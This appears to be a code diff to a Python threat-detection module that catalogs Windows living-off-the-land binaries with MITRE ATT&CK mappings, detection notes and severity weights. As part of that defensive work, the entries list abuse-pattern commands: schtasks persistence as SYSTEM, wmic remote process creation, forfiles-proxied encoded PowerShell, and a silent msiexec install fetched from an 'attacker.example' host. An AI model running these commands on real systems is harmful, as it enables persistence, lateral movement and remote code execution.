@@ -11,8 +11,8 @@ from typing import Any, Dict, List
 LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
     "certutil": {
         "full_name": "certutil.exe",
-        "mitre_sub_technique": "T1218.002",
-        "mitre_technique_name": "System Binary Proxy Execution: Control Panel",
+        "mitre_sub_technique": "T1105",
+        "mitre_technique_name": "Ingress Tool Transfer",
         "pasta_stage": "Stage4",
         "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
         "description": (
@@ -158,6 +158,167 @@ LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
         "severity_weight": 0.82,
         "decode_path": "lolbin_command_decode",
     },
+    "schtasks": {
+        "full_name": "schtasks.exe",
+        "mitre_sub_technique": "T1053.005",
+        "mitre_technique_name": "Scheduled Task/Job: Scheduled Task",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows task scheduler command-line utility. Used by attackers to create persistent "
+            "scheduled tasks that survive reboots and execute malicious payloads at regular "
+            "intervals. Tasks created with '/ru SYSTEM' escalate privileges. "
+            "Tasks named after legitimate Microsoft services (e.g., MicrosoftEdgeUpdateTask) "
+            "blend into normal system activity."
+        ),
+        "abuse_patterns": [
+            "schtasks /create /tn <task> /tr <payload> /sc minute /mo 30 /ru SYSTEM /f",
+            "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr powershell.exe /sc onlogon",
+        ],
+        "detection_note": (
+            "Scheduled task creation by non-OS processes, especially with '/ru SYSTEM' or "
+            "short intervals (/sc minute), is a high-severity persistence indicator. "
+            "Audit Windows Event ID 4698 (task created) and 4702 (task updated)."
+        ),
+        "kill_chain_stage": "persistence",
+        "severity_weight": 0.75,
+        "decode_path": "lolbin_command_decode",
+    },
+    "wmic": {
+        "full_name": "wmic.exe",
+        "mitre_sub_technique": "T1047",
+        "mitre_technique_name": "Windows Management Instrumentation",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Management Instrumentation command-line interface. Used for remote process "
+            "execution ('wmic /node: process call create'), persistence via WMI event subscriptions "
+            "(T1546.003), and lateral movement. WMI subscriptions survive reboots and run without "
+            "spawning a visible child process — a classic fileless persistence technique."
+        ),
+        "abuse_patterns": [
+            "wmic process call create \"powershell.exe -enc <payload>\"",
+            "wmic /node:<remote> process call create \"cmd.exe /c <command>\"",
+        ],
+        "detection_note": (
+            "wmic.exe invocations with 'process call create' or connections to remote nodes are "
+            "high-severity indicators. WMI event subscriptions should be audited via "
+            "Get-WMIObject -Namespace root\\subscription -Class __EventFilter."
+        ),
+        "kill_chain_stage": "execution/lateral_movement",
+        "severity_weight": 0.78,
+        "decode_path": "lolbin_command_decode",
+    },
+    "msiexec": {
+        "full_name": "msiexec.exe",
+        "mitre_sub_technique": "T1218.007",
+        "mitre_technique_name": "System Binary Proxy Execution: Msiexec",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Installer executable. Can fetch and execute remote MSI packages "
+            "('/i https://attacker.example/payload.msi /q'), bypassing application "
+            "control policies that trust signed Microsoft binaries. The '/q' flag "
+            "runs silently with no user interface."
+        ),
+        "abuse_patterns": [
+            "msiexec /i https://<attacker>/payload.msi /q          # silent remote MSI install",
+            "msiexec /y <dll>                                        # DLL registration proxy",
+        ],
+        "detection_note": (
+            "msiexec.exe making outbound HTTPS connections or loading MSI from a UNC/HTTP path "
+            "is almost always malicious. Monitor for msiexec child processes and network connections."
+        ),
+        "kill_chain_stage": "execution/defense_evasion",
+        "severity_weight": 0.77,
+        "decode_path": "lolbin_command_decode",
+    },
+    "forfiles": {
+        "full_name": "forfiles.exe",
+        "mitre_sub_technique": "T1202",
+        "mitre_technique_name": "Indirect Command Execution",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows file iterator that can execute arbitrary commands via '/c'. "
+            "Used as a cmd.exe proxy to bypass application control: "
+            "'forfiles /p C:\\Windows\\System32 /m cmd.exe /c \"cmd /c <payload>\"'. "
+            "Less commonly detected than direct cmd.exe invocations."
+        ),
+        "abuse_patterns": [
+            "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c powershell.exe -enc <b64>\"",
+        ],
+        "detection_note": (
+            "forfiles.exe with '/c' executing non-file-management commands is anomalous. "
+            "Flag forfiles spawning powershell, cmd, or network-connected processes."
+        ),
+        "kill_chain_stage": "execution/defense_evasion",
+        "severity_weight": 0.65,
+        "decode_path": "lolbin_command_decode",
+    },
+    "wscript": {
+        "full_name": "wscript.exe",
+        "mitre_sub_technique": "T1059.005",
+        "mitre_technique_name": "Command and Scripting Interpreter: Visual Basic",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Script Host — executes VBScript (.vbs) and JScript (.js) files. "
+            "Frequently used as the initial execution stage after a phishing attachment is "
+            "double-clicked. 'wscript /b' runs silently (batch mode) with no console window. "
+            "Commonly spawned by Office macros via CreateObject('WScript.Shell')."
+        ),
+        "abuse_patterns": [
+            "wscript.exe /b payload.vbs                             # silent VBS execution",
+            "wscript.exe //E:jscript payload.txt                    # JScript via renamed file",
+        ],
+        "detection_note": (
+            "wscript.exe spawned by WINWORD.EXE, EXCEL.EXE, or OUTLOOK.EXE is a "
+            "critical-severity Office-to-script-host indicator. Monitor Event ID 4688."
+        ),
+        "kill_chain_stage": "execution",
+        "severity_weight": 0.80,
+        "decode_path": "lolbin_command_decode",
+    },
+    "cscript": {
+        "full_name": "cscript.exe",
+        "mitre_sub_technique": "T1059.005",
+        "mitre_technique_name": "Command and Scripting Interpreter: Visual Basic",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Script Host console variant — executes VBScript and JScript from the "
+            "command line with console output. Often used interchangeably with wscript.exe "
+            "in attack chains. Spawning cscript from an Office process is a strong indicator."
+        ),
+        "abuse_patterns": [
+            "cscript.exe payload.vbs                                # console VBS execution",
+            "cscript.exe //E:jscript //nologo payload.js            # JScript silent execution",
+        ],
+        "detection_note": (
+            "Same detection logic as wscript.exe. Correlate with parent process — "
+            "Office applications spawning cscript.exe is a confirmed macro execution indicator."
+        ),
+        "kill_chain_stage": "execution",
+        "severity_weight": 0.78,
+        "decode_path": "lolbin_command_decode",
+    },
+}
+
+_LOLBIN_ATTACK_BY_BINARY: Dict[str, List[str]] = {
+    "certutil": ["T1105"],
+    "bitsadmin": ["T1197"],
+    "mshta": ["T1218.005"],
+    "regsvr32": ["T1218.010"],
+    "rundll32": ["T1218.011"],
+    "wscript": ["T1059.005"],
+    "cscript": ["T1059.005"],
+    "powershell": ["T1059.001"],
+    "schtasks": ["T1053.005"],
+    "wmic": ["T1047"],
+    "msiexec": ["T1218.007"],
+    "forfiles": ["T1202"],
+    "cmd": ["T1059.003"],
 }
 
 
@@ -184,3 +345,23 @@ def enrich_lolbin_indicators(lolbin_hits: List[str]) -> List[Dict[str, Any]]:
                 out.append(entry)
                 break
     return out
+
+
+def canonical_attack_ids_for_binary(binary: str, command_text: str | None = None) -> List[str]:
+    name = str(binary or "").strip().lower().replace(".exe", "")
+    command = str(command_text or "").strip().lower()
+    out = list(_LOLBIN_ATTACK_BY_BINARY.get(name, []))
+    if name == "certutil" and any(tok in command for tok in ("-decode", " decode ", "frombase64string")):
+        out.append("T1140")
+    seen: set[str] = set()
+    return [x for x in out if x and not (x in seen or seen.add(x))]
+
+
+def derive_lolbin_attack_ids_from_text(content_text: str) -> List[str]:
+    lowered = str(content_text or "").lower()
+    found: List[str] = []
+    for key in LOLBIN_CATALOG:
+        if key in lowered:
+            found.extend(canonical_attack_ids_for_binary(key, lowered))
+    seen: set[str] = set()
+    return [x for x in found if x and not (x in seen or seen.add(x))]
